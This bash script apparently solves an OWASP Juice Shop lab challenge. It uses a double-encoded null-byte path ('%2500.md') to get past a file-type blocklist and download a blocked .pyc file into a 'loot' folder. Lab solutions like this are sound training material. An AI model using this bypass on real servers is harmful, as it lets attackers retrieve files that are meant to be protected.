#!/bin/bash
# c09-pyc-reverse : retrieve /ftp/encrypt.pyc from Juice Shop
#
# Direct GET /ftp/encrypt.pyc -> HTTP 403 (server-side blocklist on .pyc / .bak).
# The blocklist check is done on the raw path while the file lookup is done after
# URL-decoding, so a double-encoded NUL + harmless ".md" suffix slips past it:
#     /ftp/encrypt.pyc%2500.md   ("%25" -> "%", so the server decodes to "encrypt.pyc%00.md"
#                                 then truncates at NUL for the file lookup)
# Result: HTTP 200, 573 bytes of Python 2.7 bytecode.
set -euo pipefail
TARGET="${TARGET:-http://host.docker.internal:3000}"
OUT="${1:-/workspace/loot/encrypt.pyc}"
mkdir -p "$(dirname "$OUT")"

echo "[*] direct request (expected 403):"
curl -s -o /dev/null -w '    GET /ftp/encrypt.pyc          -> %{http_code}\n' "$TARGET/ftp/encrypt.pyc"

echo "[*] null-byte / double-encoding bypass:"
code=$(curl -s -o "$OUT" -w '%{http_code}' "$TARGET/ftp/encrypt.pyc%2500.md")
echo "    GET /ftp/encrypt.pyc%2500.md -> $code  ($(stat -c%s "$OUT") bytes)"

[ "$code" = "200" ] || { echo "[!] bypass failed"; exit 1; }
head -c 4 "$OUT" | od -A n -t x1 | tr -d ' \n' | grep -q '03f30d0a' \
  && echo "[+] valid Python 2.7 .pyc magic (03 f3 0d 0a)" \
  || { echo "[!] unexpected magic"; exit 1; }
sha256sum "$OUT"
